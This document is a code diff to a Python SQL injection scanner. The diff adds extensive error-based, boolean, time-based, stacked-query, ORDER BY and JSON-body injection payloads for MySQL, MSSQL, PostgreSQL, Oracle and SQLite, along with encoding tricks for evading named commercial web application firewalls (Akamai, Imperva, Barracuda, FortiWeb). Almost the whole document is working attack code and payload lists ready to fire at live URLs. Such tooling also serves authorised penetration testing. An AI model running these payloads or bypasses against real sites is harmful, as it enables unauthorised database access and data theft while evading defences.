@@ -159,6 +159,21 @@ class SQLiScanner:
             "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT database()),0x7e),1)-- -",
             # Double query
             "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)y)-- -",
+            # BIGINT overflow (MySQL 5.5.5+)
+            "' AND !(SELECT*FROM(SELECT CONCAT(0x7e,version(),0x7e))x)-~0-- -",
+            "' AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7e,version(),0x7e,0x7e))s), 8446744073709551610, 8446744073709551610)))-- -",
+            # EXP() overflow (MySQL 5.5.5+)
+            "' AND EXP(~(SELECT*FROM(SELECT version())x))-- -",
+            # NAME_CONST (MySQL < 5.1 duplicate key)
+            "' AND (SELECT*FROM(SELECT NAME_CONST(version(),1),NAME_CONST(version(),1))x)-- -",
+            # JSON error extraction (MySQL 5.7+)
+            "' AND JSON_KEYS((SELECT CONCAT(0x7e,version(),0x7e)))-- -",
+            # GEOMETRYCOLLECTION
+            "' AND GEOMETRYCOLLECTION((SELECT*FROM(SELECT*FROM(SELECT version())a)b))-- -",
+            # Numeric boundary
+            "' AND 1=(SELECT COUNT(*) FROM information_schema.tables GROUP BY CONCAT(version(),FLOOR(RAND(0)*2)))-- -",
+            # Integer subquery
+            " AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -",
         ],
         "mssql": [
             "' AND 1=CONVERT(int,(SELECT @@version))-- -",
@@ -166,16 +181,52 @@ class SQLiScanner:
             "' AND 1=CONVERT(int,(SELECT SYSTEM_USER))-- -",
             "' HAVING 1=1-- -",
             "' GROUP BY 1 HAVING 1=1-- -",
+            # STR/CHAR conversion
+            "' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))-- -",
+            "' AND 1=CONVERT(int,(SELECT IS_SRVROLEMEMBER('sysadmin')))-- -",
+            # FOR XML PATH error
+            "' AND 1=CONVERT(int,(SELECT STUFF((SELECT CHAR(58)+name FROM master..sysdatabases FOR XML PATH('')),1,1,'')))-- -",
+            # Numeric
+            " AND 1=CONVERT(int,@@version)-- -",
+            # Stacked query error disclosure
+            "'; SELECT 1/0-- -",
         ],
         "postgresql": [
             "' AND 1=CAST((SELECT version()) AS int)-- -",
             "' AND 1=CAST((SELECT current_database()) AS int)-- -",
             "' AND 1=CAST((SELECT current_user) AS int)-- -",
             "'::int-- -",
+            # XML / query_to_xml error extraction
+            "' AND 1=CAST((SELECT query_to_xml('SELECT version()',true,false,'')) AS int)-- -",
+            # Array error extraction
+            "' AND 1=CAST((SELECT string_agg(datname,',') FROM pg_database) AS int)-- -",
+            # Numeric boundary
+            " AND 1=CAST(version() AS int)-- -",
+            # Generate series
+            "' AND 1=CAST((SELECT current_setting('server_version')) AS int)-- -",
         ],
         "oracle": [
             "' AND 1=UTL_INADDR.GET_HOST_ADDRESS((SELECT banner FROM v$version WHERE ROWNUM=1))-- -",
             "' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE ROWNUM=1))-- -",
+            # XMLType error
+            "' AND (SELECT XMLType('<:'||(SELECT banner FROM v$version WHERE ROWNUM=1)||'-->') FROM dual)='1'-- -",
+            # DBMS_XDB_VERSION
+            "' AND 1=DBMS_XDB_VERSION.CHECKIN((SELECT banner FROM v$version WHERE ROWNUM=1))-- -",
+            # TO_NUMBER
+            "' AND 1=TO_NUMBER((SELECT banner FROM v$version WHERE ROWNUM=1))-- -",
+        ],
+        "sqlite": [
+            # SQLite error-based via CASE / type coercion
+            "' AND 1=CAST((SELECT sqlite_version()) AS int)-- -",
+            "' AND 1=CAST((SELECT group_concat(name,',') FROM sqlite_master WHERE type='table') AS int)-- -",
+            # ABS overflow (SQLite 3.8.6+)
+            "' AND ABS(-9223372036854775807)-- -",
+            # MATCH error for FTS tables
+            "' AND 1=MATCH(1,1)-- -",
+            # Unicode
+            "' AND UNICODE(1)-- -",
+            # ZEROBLOB large alloc
+            "' AND ZEROBLOB(999999999)-- -",
         ],
     }
     
@@ -193,6 +244,30 @@ class SQLiScanner:
         "1' AND '1'='2",
         "-1 OR 1=1",
         "1)) OR 1=1--",
+        # Parenthesis-based
+        "') OR ('1'='1",
+        "')) OR (('1'='1",
+        # Comment-based
+        "' OR 1=1#",
+        "' OR 1=1/*",
+        # Backtick (MySQL)
+        "`",
+        "1`1",
+        # Numeric variations
+        "0",
+        "-0",
+        "999999999",
+        # Special characters that trigger errors
+        "\\",
+        "' OR 'x'='x",
+        # Double-encoding
+        "%27",
+        "%22",
+        # NULL injection
+        "' OR 1 IS NOT NULL-- -",
+        # JSON context
+        "{'test': 1}",
+        "[1]",
     ]
     
     # Time-based payloads
@@ -204,17 +279,41 @@ class SQLiScanner:
             " AND SLEEP({delay})-- -",
             "' OR SLEEP({delay})-- -",
             "1 AND BENCHMARK(5000000,SHA1('test'))-- -",
+            # Heavy query (no SLEEP needed — bypasses WAFs blocking sleep/benchmark)
+            "' AND (SELECT COUNT(*) FROM information_schema.columns A, information_schema.columns B, information_schema.columns C)-- -",
+            # Conditional heavy query
+            "' AND IF(1=1,(SELECT COUNT(*) FROM information_schema.columns A, information_schema.columns B),0)-- -",
         ],
         "mssql": [
             "'; WAITFOR DELAY '0:0:{delay}'-- -",
             "' AND 1=1; WAITFOR DELAY '0:0:{delay}'-- -",
+            # Stacked query WAITFOR
+            "'; IF(1=1) WAITFOR DELAY '0:0:{delay}'-- -",
+            # Heavy query
+            "' AND (SELECT COUNT(*) FROM sysusers AS a CROSS JOIN sysusers AS b CROSS JOIN sysusers AS c)>0-- -",
         ],
         "postgresql": [
             "'; SELECT pg_sleep({delay})-- -",
             "' AND 1=(SELECT 1 FROM pg_sleep({delay}))-- -",
+            # Conditional pg_sleep
+            "' AND (CASE WHEN (1=1) THEN pg_sleep({delay}) ELSE pg_sleep(0) END) IS NOT NULL-- -",
+            # Heavy query
+            "' AND (SELECT COUNT(*) FROM generate_series(1,10000000))>0-- -",
         ],
         "oracle": [
             "' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',{delay})-- -",
+            # UTL_HTTP (if outbound allowed)
+            "' AND 1=DBMS_LOCK.SLEEP({delay})-- -",
+            # Heavy query
+            "' AND (SELECT COUNT(*) FROM all_objects A, all_objects B)>0-- -",
+        ],
+        "sqlite": [
+            # SQLite has no SLEEP — use LIKE on large ZEROBLOB or RANDOMBLOB
+            "' AND LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))-- -",
+            # Heavy computation via recursive CTE
+            "' AND (SELECT COUNT(*) FROM (WITH RECURSIVE c(x) AS (VALUES(1) UNION ALL SELECT x+1 FROM c WHERE x<100000) SELECT x FROM c))>0-- -",
+            # REPLACE chain (CPU-bound)
+            "' AND REPLACE(REPLACE(REPLACE(REPLACE(HEX(ZEROBLOB(500000)),'0','a'),'a','bb'),'b','cc'),'c','dd') IS NOT NULL-- -",
         ],
     }
     
@@ -322,6 +421,40 @@ class SQLiScanner:
             ],
             "techniques": ["time", "boolean"],
         },
+        "Akamai": {
+            "encodings": [
+                lambda p: p.replace(" ", "%09"),  # Tab
+                lambda p: p.replace("UNION", "UNI%00ON").replace("SELECT", "SEL%00ECT"),  # Null byte
+                lambda p: p.replace("'", "%ef%bc%87"),  # Fullwidth apostrophe
+                lambda p: re.sub(r'(AND|OR|UNION|SELECT)', lambda m: f'/*!50000{m.group()}*/', p, flags=re.I),
+            ],
+            "techniques": ["time", "boolean"],
+        },
+        "Imperva": {
+            "encodings": [
+                lambda p: p.replace("UNION", "UNI%0BON").replace("SELECT", "SEL%0BECT"),
+                lambda p: p.replace(" ", "%0a"),  # Newline
+                lambda p: re.sub(r'UNION\s+SELECT', '%55NION%20%53ELECT', p, flags=re.I),
+                lambda p: p.replace("AND", "AN%00D").replace("OR", "O%00R"),
+            ],
+            "techniques": ["time"],
+        },
+        "Barracuda": {
+            "encodings": [
+                lambda p: p.replace("SELECT", "SeLeCt").replace("UNION", "uNiOn"),
+                lambda p: p.replace(" ", "/**/"),
+                lambda p: p.replace("'", "convert(varchar,0x27)"),
+            ],
+            "techniques": ["time", "error"],
+        },
+        "FortiWeb": {
+            "encodings": [
+                lambda p: p.replace("UNION", "%55nion").replace("SELECT", "%53elect"),
+                lambda p: p.replace(" ", "/**/"),
+                lambda p: p.replace("AND", "&&"),
+            ],
+            "techniques": ["time", "boolean"],
+        },
     }
 
     # ── Technology → likely DBMS mapping ──
@@ -358,6 +491,43 @@ class SQLiScanner:
         "CF-Connecting-IP",
         "True-Client-IP",
         "Client-IP",
+        "User-Agent",
+        "X-Cluster-Client-IP",
+        "X-Remote-IP",
+        "X-Remote-Addr",
+        "Forwarded",
+        "X-ProxyUser-Ip",
+        "Via",
+        "Contact",
+        "From",
+        "X-Wap-Profile",
+        "X-Api-Version",
+    ]
+
+    # ── Stacked query payloads (for DBMS that support batched statements) ──
+    STACKED_PAYLOADS = {
+        "mssql": [
+            "'; WAITFOR DELAY '0:0:{delay}'-- -",
+            "'; SELECT @@version-- -",
+            "'; IF(1=1) WAITFOR DELAY '0:0:{delay}'-- -",
+        ],
+        "postgresql": [
+            "'; SELECT pg_sleep({delay})-- -",
+            "'; SELECT version()-- -",
+            "'; CREATE TEMP TABLE IF NOT EXISTS nZrqT(x int); DROP TABLE IF EXISTS nZrqT-- -",
+        ],
+        "mysql": [
+            "'; SELECT SLEEP({delay})-- -",
+            "'; SELECT 1-- -",
+        ],
+    }
+
+    # ── ORDER BY / GROUP BY injection payloads ──
+    ORDER_BY_PAYLOADS = [
+        ",(SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)",
+        " ASC,(SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)",
+        " DESC,IF(1=1,1,(SELECT 1 FROM information_schema.tables))",
+        " RLIKE (SELECT (CASE WHEN (1=1) THEN 1 ELSE 0x28 END))",
     ]
 
     def __init__(self, timeout: int = 15, max_concurrent: int = 10, 
@@ -1335,6 +1505,17 @@ class SQLiScanner:
             ("' AND 1=1-- -", "' AND 1=2-- -"),
             (" AND 1=1-- -", " AND 1=2-- -"),
             ("') AND ('1'='1", "') AND ('1'='2"),
+            # Double-quote context
+            ('" AND "1"="1', '" AND "1"="2'),
+            # Parenthesized
+            ("') AND 1=1-- -", "') AND 1=2-- -"),
+            ("')) AND 1=1-- -", "')) AND 1=2-- -"),
+            # OR-based (for pages that show data only on true)
+            ("' OR 1=1-- -", "' OR 1=2-- -"),
+            # LIKE-based
+            ("' AND 1 LIKE 1-- -", "' AND 1 LIKE 2-- -"),
+            # NULL comparison
+            ("' AND 1 IS NOT NULL-- -", "' AND 1 IS NULL-- -"),
         ]
         
         for true_payload, false_payload in test_pairs:
@@ -1373,6 +1554,189 @@ class SQLiScanner:
                     confidence=0.70,
                 )
                 logger.info(f"Boolean-based SQLi found: {url} param={param_name}")
+                return result
+        
+        return None
+
+    async def test_stacked_queries(self, url: str, param_name: str,
+                                    session: aiohttp.ClientSession) -> Optional[SQLiResult]:
+        """Test stacked query (batched statement) injection.
+        
+        MSSQL and PostgreSQL support stacked queries via semicolons.
+        Uses time-based verification to confirm execution.
+        """
+        base, params = self._parse_url(url)
+        delay = self.delay
+        
+        for dbms, payloads in self.STACKED_PAYLOADS.items():
+            for payload_tpl in payloads:
+                payload = payload_tpl.replace("{delay}", str(delay))
+                test_params = params.copy()
+                original = test_params[param_name][0] if isinstance(test_params[param_name], list) else test_params[param_name]
+                test_params[param_name] = [str(original) + payload]
+                test_url = self._build_url(base, test_params)
+                
+                body, elapsed = await self._fetch(test_url, session)
+                if elapsed < 0:
+                    continue
+                
+                # Time-based confirmation for WAITFOR/pg_sleep payloads
+                if "{delay}" in payload_tpl and elapsed >= delay * 0.8:
+                    # Verify with no-delay variant
+                    verify_payload = payload_tpl.replace("{delay}", "0")
+                    verify_params = params.copy()
+                    verify_params[param_name] = [str(original) + verify_payload]
+                    verify_url = self._build_url(base, verify_params)
+                    _, verify_elapsed = await self._fetch(verify_url, session)
+                    
+                    if verify_elapsed >= 0 and verify_elapsed < delay * 0.5:
+                        result = SQLiResult(
+                            url=url,
+                            parameter=param_name,
+                            vulnerable=True,
+                            injection_type="stacked",
+                            dbms=dbms,
+                            technique="Stacked queries (batched statements)",
+                            payload_used=payload,
+                            confidence=0.85,
+                        )
+                        logger.info(f"Stacked query SQLi found: {url} param={param_name} dbms={dbms}")
+                        return result
+                
+                # Error-based confirmation for non-delay payloads
+                elif body and self._detect_dbms(body):
+                    result = SQLiResult(
+                        url=url,
+                        parameter=param_name,
+                        vulnerable=True,
+                        injection_type="stacked",
+                        dbms=dbms,
+                        technique="Stacked queries (error disclosure)",
+                        payload_used=payload,
+                        confidence=0.75,
+                    )
+                    logger.info(f"Stacked query (error) SQLi found: {url} param={param_name}")
+                    return result
+        
+        return None
+
+    async def test_json_body_injection(self, url: str, session: aiohttp.ClientSession,
+                                        waf_name: str = None) -> List[SQLiResult]:
+        """Test JSON body parameter injection.
+        
+        Many modern APIs accept JSON bodies. Tests each key for SQLi.
+        """
+        import json as json_module
+        results = []
+        
+        # Standard JSON payloads to test
+        json_test_payloads = [
+            "'",
+            "' OR '1'='1",
+            "1 OR 1=1",
+            "' AND SLEEP(3)-- -",
+            "1' AND '1'='1",
+        ]
+        
+        # Common JSON body shapes to test
+        json_bodies = [
+            {"username": "test", "password": "test"},
+            {"email": "test@test.com", "password": "test"},
+            {"id": "1", "action": "view"},
+            {"search": "test", "page": "1"},
+            {"user": "test", "pass": "test"},
+            {"login": "test", "passwd": "test"},
+            {"q": "test"},
+            {"query": "test"},
+        ]
+        
+        headers = {
+            "User-Agent": self.user_agent,
+            "Content-Type": "application/json",
+            "Accept": "application/json",
+        }
+        
+        for json_body in json_bodies:
+            for key in json_body:
+                for payload in json_test_payloads:
+                    try:
+                        test_body = json_body.copy()
+                        test_body[key] = str(test_body[key]) + payload
+                        
+                        if waf_name:
+                            bypasses = self._apply_waf_bypass(payload, waf_name)
+                            test_body[key] = str(json_body[key]) + bypasses[0]
+                        
+                        async with self.semaphore:
+                            async with session.post(
+                                url, json=test_body, headers=headers,
+                                allow_redirects=True, ssl=False, proxy=self.proxy
+                            ) as resp:
+                                body = await resp.text(errors="ignore")
+                        
+                        dbms = self._detect_dbms(body)
+                        if dbms:
+                            result = SQLiResult(
+                                url=url,
+                                parameter=f"JSON:{key}",
+                                vulnerable=True,
+                                injection_type="error",
+                                dbms=dbms,
+                                technique=f"JSON body injection",
+                                payload_used=f'{key}={payload}',
+                                confidence=0.85,
+                                injection_point="post",
+                            )
+                            logger.info(f"JSON body SQLi! {url} key={key} dbms={dbms}")
+                            results.append(result)
+                            break  # Found for this key, move to next body
+                    except Exception as e:
+                        logger.debug(f"JSON injection error: {e}")
+                        continue
+                if results:
+                    break  # Found in this body shape
+            if results:
+                break
+        
+        return results
+
+    async def test_order_by_injection(self, url: str, param_name: str,
+                                       session: aiohttp.ClientSession) -> Optional[SQLiResult]:
+        """Test ORDER BY / GROUP BY clause injection.
+
+        Checks if the parameter controls sorting — if so, injects subqueries.
+        """
+        base, params = self._parse_url(url)
+        
+        # ORDER BY params are typically named sort, order, orderby, sortby, dir, column
+        order_names = {"sort", "order", "orderby", "sortby", "order_by", "sort_by",
+                       "dir", "direction", "column", "col", "field", "sortfield"}
+        if param_name.lower() not in order_names:
+            return None
+        
+        for payload in self.ORDER_BY_PAYLOADS:
+            test_params = params.copy()
+            original = test_params[param_name][0] if isinstance(test_params[param_name], list) else test_params[param_name]
+            test_params[param_name] = [str(original) + payload]
+            test_url = self._build_url(base, test_params)
+            
+            body, _ = await self._fetch(test_url, session)
+            if not body:
+                continue
+            
+            dbms = self._detect_dbms(body)
+            if dbms:
+                result = SQLiResult(
+                    url=url,
+                    parameter=param_name,
+                    vulnerable=True,
+                    injection_type="error",
+                    dbms=dbms,
+                    technique="ORDER BY clause injection",
+                    payload_used=payload,
+                    confidence=0.80,
+                )
+                logger.info(f"ORDER BY injection found: {url} param={param_name}")
                 return result
         
         return None
@@ -1458,6 +1822,18 @@ class SQLiScanner:
                     time_result = await self.test_time_based(url, param_name, session)
                     if time_result:
                         results.append(time_result)
+                        continue
+                    
+                    # Stacked query test (MSSQL/PostgreSQL)
+                    stacked_result = await self.test_stacked_queries(url, param_name, session)
+                    if stacked_result:
+                        results.append(stacked_result)
+                        continue
+                    
+                    # ORDER BY clause injection (for sort/order params)
+                    orderby_result = await self.test_order_by_injection(url, param_name, session)
+                    if orderby_result:
+                        results.append(orderby_result)
             
             # ═══ 2. Cookie Injection ═══
             cookie_results = await self.test_cookie_injection(url, session, waf_name)
@@ -1472,6 +1848,10 @@ class SQLiScanner:
             for form in forms:
                 post_results = await self.test_post_injection(form, session, waf_name)
                 results.extend(post_results)
+            
+            # ═══ 5. JSON Body Injection ═══
+            json_results = await self.test_json_body_injection(url, session, waf_name)
+            results.extend(json_results)
         
         except Exception as e:
             logger.error(f"Scan error for {url}: {e}")
